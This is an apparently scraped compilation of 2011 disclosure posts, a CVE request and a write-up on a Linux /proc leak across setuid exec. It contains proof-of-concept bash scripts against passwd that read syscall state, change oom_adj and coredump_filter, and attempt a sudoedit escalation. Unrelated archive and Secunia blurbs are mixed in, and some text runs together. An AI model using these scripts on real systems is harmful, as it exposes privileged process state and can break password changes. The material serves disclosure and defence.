Local attackers are able tobypass DAC permissions in /proc/$pid/ when they can exec a setuid program.As long as the fd is open before the exec, its contents remain readableafter the exec, even to a setuid program. Here is auxv being scanned forvalues that should be private, due to ASLR:$ ./procleak.py auxv /usr/bin/passwdAT_BASE:   0x7f761076f000AT_RANDOM: 0x7fff23697969Changing password for kees.(current) UNIX password: Note that AT_RANDOM is the _location_ of AT_RANDOM, not the value itself,but this therefore leaks stack location, and AT_BASE leaks the mmapposition of ld:7f761076f000-7f761078f000 r-xp 00000000 fc:00 1051386 /lib/ld-2.12.2.so...7fff23678000-7fff23699000 rw-p 00000000 00:00 0 [stack]Additionally, snooping on the kernel stack, the syscall parameters, andeven changing oom_adj is possible. Luckily, maps, mem, etc are alreadyprotected by may_ptrace(). The attached tool can demonstrate the snooping,just specify which /proc/$pid files you want, and the setuid program tolaunch. For example:$ ./procleak.py auxv,syscall /usr/bin/passwdrunningAT_BASE:   0x7f2828bde000AT_RANDOM: 0x7fff80bde7c9Changing password for kees.(current) UNIX password: 0 0x0 0x7fff80bdda90 0x1ff 0x7fff80bdd580 0x7f2828dc57c0 0x7f28287cec1d 0x7fff80bdd088 0x7f28282fe6c0There needs to be some way to break the connection to these files acrossthe setuid exec, or perform some sort of revalidation of permissions.

In my reply to FD-post "GNU libc/regcomp(3) Multiple Vulnerabilities" I
indicated, that I found and reported the same bug while searching for
resource starvation bugs two years ago. So I dug out the programs from
back than to test suid binaries on recent linux distro and kernel. While
it is still possible to trigger quite a few different flaws, none of
them is quite interesting enough to investigate (mostly NULL and -1
derefs). But I got a minor but funny fault:

When executing a process as normal user, one can open /proc/[pid]/
entries and keep them open, even after executing a suid binary. Thus it
is possible e.g. to
* Find stack base even with stack randomization
* Modify oom_adj and kill the suid-binary with SIGKILL
* Modify the coredump filter
* Read limits

Damn it, that /proc/self/mem is not rw

See <http://www.halfdog.net/Security/2011/SuidBinariesAndProcInterface/>

Apart from that, ping6 contains a trivial buffer overflow using the size
parameter (>128000), but I think it is not exploitable to gain root
privileges.

See <http://www.halfdog.net/Security/2011/Ping6BufferOverflow/>

The auxv filealone is a nearly total ASLR offset leak. The may_ptrace() worked wellfor /proc/$pid/maps, and it started as 0444 historically and had a lotof additional carefully managed requirements. Adding the same restrictionto all the already-mode-0400 files seems logical.-Kees-- Kees CookUbuntu Security Team ``` | \ |

Subject: CVE request: kernel: /proc/$pid/ leaks contents across setuid exec

Hi,

I'd like to get a CVE assigned for this information leak issue:
<https://lkml.org/lkml/2011/2/7/368>

Pre-opened file descriptors in /proc/$pid/ can bypass DAC allowing
visibility into setuid process state, especially leaking ASLR offset.

Thanks,

-Kees

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

The task should not receive the wrong > information from /proc/[pid]/* .Per task files are special because of exec.  The permission neededchange dynamically.  The common solution to this problem (see ttys) isto revoke anyone who has file descriptors open.  Proc does something alittle different and simply gives you a permission error when you reador write if it would be a problem.We happen to call the test to see if you should have permissionsecurity_may_ptrace because ptrace lets you get the information anywayso we might as well allow the information from /proc.Given that security_may_ptrace is the existing model, and that we don'treturn wrong data, but a clear an unambiguous error I don't see problemswith the approach.The practical question is, is the data sensitive enough that we wantthis protection.Eric ``` | \ |

# /proc Handling of Already Opened Files: Subvert The Stack Base Address Randomization With Suid-Binaries

## Problem description:

Latest ubuntu lucid stock kernel (2.6.32-27-generic)
contains a bug
that allows to keep attached to open /proc file entries as lower
privileged user even after the process is executing suid binary.
By doing that, a malicous user might draw information from the
proc interface or even modify process settings of privileged process.

## Monitor syscalls, syscall stack, limits of running suid-binaries:

A simple helper program
(<ProcReadHelper.c>)
is sufficient to open a proc entry before executing a suid program and
keep it open. (<SyscallReadExample.sh>):

#!/bin/bash
(./ProcReadHelper /proc/$$/syscall) &
sleep 1
exec /usr/bin/passwd

Output:

Read 69 bytes:
7 0xffffffff 0xbff646ac 0x0 0x0 0xf4d 0xbff646c8 0xbff64654 0x64b422
Changing password for test.
(current) UNIX password: Read 69 bytes:
3 0x0 0xbffb4a84 0x1ff 0x0 0xbffb4a84 0xbffb4d18 0xbffb4814 0xf30422
Read 69 bytes:
3 0x0 0xbffb4a84 0x1ff 0x0 0xbffb4a84 0xbffb4d18 0xbffb4814 0xf30422

The same can be done with /proc/[pid]/stack or /proc/[pid]/limits, where
one can see how passwd increases its limits to unlimited after invocation.

## Modify core dump flags of running suid-binaries:

Since proc is also writeable, the same
technique can be used to
modify open proc files, e.g. adjust the coredump filter of a currently
running *passwd* program
(<ModifyCoreDumpFilter.sh>):

#!/bin/bash
echo "Current pid is $$"
(sleep 10; echo 127 ) > /proc/$$/coredump\_filter &
sleep 5
exec /usr/bin/passwd

Some open proc files can only be written by the process itself, e.g.
*/proc/[pid]/mem*, a limitation that could be circumvented if
any suid-binary echos out command line/input file/environment data,
e.g. *sudoedit -p xxx /etc/sudoers* echos *xxx*. If
/procc/[pid]/mem would be writeable on standard linux kernels,
this program should give local root privilege escalation
(<SeekHelper.c>), e.g.
*./SeekHelper /proc/self/mem 8048000 /usr/bin/sudoedit -p xxx /etc/sudoers*
with a crafted address and promt payload. Currently something
else is still blocking in kernel, could be *fs/proc/base.c*:

static ssize\_t mem\_read(struct file \* file, char \_\_user \* buf,
size\_t count, loff\_t \*ppos) {
...
if (file->private\_data != (void\*)((long)current->self\_exec\_id))
goto out\_put;

## Inject faults using oom\_adjust:

Some programs, e.g. from the *shadow* suite, try to disable
all signals and limits to assure that critical code is not
interrupted, e.g. modification of */etc/shadow* when a
unprivileged user changes his password. Since this program
creates a lock file, interruption via oom\_kill could leave
stale lockfiles and so impede functionality.

test@localhost:~/Tasks/LowMemoryProgramCrashing$ cat OomRun.sh
#!/bin/bash
(sleep 3; echo 15) > /proc/$$/oom\_adj &
exec /usr/bin/passwd

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
